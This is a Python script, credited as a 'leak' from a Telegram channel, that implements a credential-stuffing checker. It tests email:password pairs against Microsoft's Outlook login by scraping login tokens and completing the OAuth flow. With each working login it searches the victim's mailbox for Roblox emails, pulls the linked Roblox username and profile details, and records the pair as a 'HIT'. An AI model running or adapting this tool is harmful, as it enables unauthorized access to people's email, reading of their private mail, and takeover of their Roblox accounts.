import re
import uuid
import requests
from datetime import datetime, timezone

# Leak by @SenseiNoir
# Channel: https://t.me/SenseiFall

class RobloxChecker:
    def __init__(self):
        self.session = requests.Session()
        self.timeout = (10, 15)

    def get_user_id(self, username):
        try:
            r = self.session.post("https://users.roblox.com/v1/usernames/users", json={"usernames": [username], "excludeBannedUsers": False}, timeout=self.timeout)
            if r.status_code == 200 and r.json().get("data"):
                return r.json()["data"][0]["id"]
        except Exception:
            pass
        return None

    def get_roblox_profile(self, username):
        res = {"username": username, "friends": 0, "banned": "No", "created": "Unknown", "profile": ""}
        user_id = self.get_user_id(username)
        if not user_id:
            return res
        try:
            user_data = self.session.get(f"https://users.roblox.com/v1/users/{user_id}", timeout=self.timeout).json()
            res["banned"] = "Yes" if user_data.get("isBanned") else "No"
            created_raw = user_data.get("created", "")
            res["created"] = created_raw.split("T")[0] if created_raw else "Unknown"
            res["friends"] = self.session.get(f"https://friends.roblox.com/v1/users/{user_id}/friends/count", timeout=self.timeout).json().get("count", 0)
            res["profile"] = f"https://www.roblox.com/users/{user_id}/profile"
        except Exception:
            pass
        return res

    def extract_roblox_username(self, text):
        patterns = [
            r'Hello\s+([a-zA-Z0-9_]+),',
            r'Hi\s+([a-zA-Z0-9_]+),',
            r'Your Roblox account\s+([a-zA-Z0-9_]+)',
            r'Username:\s*([a-zA-Z0-9_]+)',
            r'account:\s*([a-zA-Z0-9_]+)',
        ]
        for pattern in patterns:
            match = re.search(pattern, text, re.IGNORECASE)
            if match:
                return match.group(1)
        return None

    def check_account(self, email, password):
        try:
            r1 = self.session.get("https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress=" + email,
                headers={"X-OneAuth-AppName": "Outlook Lite", "X-Office-Version": "3.11.0-minApi24",
                         "X-CorrelationId": str(uuid.uuid4()), "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
                         "Host": "odc.officeapps.live.com", "Connection": "Keep-Alive"}, timeout=self.timeout)
            if "Neither" in r1.text or "Both" in r1.text or "Placeholder" in r1.text:
                return {"status": "BAD", "email": email, "password": password, "reason": "Not Hotmail"}
            r2 = self.session.get("https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint=" + email + "&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D",
                headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Connection": "keep-alive"},
                allow_redirects=True, timeout=self.timeout)
            url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
            ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
            if not url_match or not ppft_match:
                return {"status": "BAD", "email": email, "password": password, "reason": "Parse error"}
            r3 = self.session.post(url_match.group(1).replace("\\/", "/"),
                data=f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={ppft_match.group(1)}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960",
                headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Origin": "https://login.live.com", "Referer": r2.url},
                allow_redirects=False, timeout=self.timeout)
            if "account or password is incorrect" in r3.text or r3.text.count("error") > 0 or "https://account.live.com/identity/confirm" in r3.text or "Abuse" in r3.text:
                return {"status": "BAD", "email": email, "password": password, "reason": "Invalid credentials"}
            code_match = re.search(r'code=([^&]+)', r3.headers.get("Location", ""))
            mspcid = self.session.cookies.get("MSPCID", "")
            if not code_match or not mspcid:
                return {"status": "BAD", "email": email, "password": password, "reason": "No auth data"}
            r4 = self.session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
                data=f"client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code={code_match.group(1)}&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access",
                headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=self.timeout)
            if "access_token" not in r4.text:
                return {"status": "BAD", "email": email, "password": password, "reason": "Token error"}
            access_token = r4.json()['access_token']
            search_payload = {
                "Cvid": str(uuid.uuid4()),
                "Scenario": {"Name": "owa.react"},
                "TimeZone": "UTC",
                "TextDecorations": "Off",
                "EntityRequests": [{
                    "EntityType": "Conversation",
                    "ContentSources": ["Exchange"],
                    "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}, {"Term": {"DistinguishedFolderName": "DeletedItems"}}]},
                    "From": 0,
                    "Query": {"QueryString": "noreply@roblox.com OR no-reply@roblox.com"},
                    "Size": 50,
                    "Sort": [{"Field": "Time", "SortDirection": "Desc"}],
                    "EnableTopResults": True,
                    "TopResultsCount": 3
                }],
                "QueryAlterationOptions": {"EnableSuggestion": True, "EnableAlteration": True, "SupportedRecourseDisplayTypes": ["Suggestion"]},
                "LogicalId": str(uuid.uuid4())
            }
            search_headers = {
                "User-Agent": "Outlook-Android/2.0",
                "Accept": "application/json",
                "Authorization": f"Bearer {access_token}",
                "X-AnchorMailbox": f"CID:{mspcid.upper()}",
                "Host": "substrate.office.com",
                "Content-Type": "application/json"
            }
            search_resp = self.session.post("https://outlook.live.com/search/api/v2/query?n=124&cv=tNZ1DVP5NhDwG%2FDUCelaIu.124",
                json=search_payload, headers=search_headers, timeout=self.timeout)
            if search_resp.status_code == 200:
                total_match = re.search(r'"Total":(\d+)', search_resp.text)
                total_roblox = int(total_match.group(1)) if total_match else 0
                if total_roblox > 0:
                    roblox_user = self.extract_roblox_username(search_resp.text)
                    if roblox_user:
                        p = self.get_roblox_profile(roblox_user)
                        data_line = f"{email}:{password} | Total Roblox: {total_roblox} | Username: {p.get('username','Unknown')} | Friends: {p.get('friends',0)} | Banned: {p.get('banned','No')} | Created: {p.get('created','Unknown')} | Profile: {p.get('profile','')}"
                        return {"status": "HIT", "email": email, "password": password, "data": [data_line]}
                return {"status": "FREE", "email": email, "password": password, "reason": "No Roblox emails"}
            return {"status": "ERROR", "email": email, "password": password, "reason": "Search failed"}
        except Exception as e:
            return {"status": "ERROR", "email": email, "password": password, "reason": str(e)[:50]}

    def get_stats(self):
        return {"total_checked": 0, "total_hits": 0}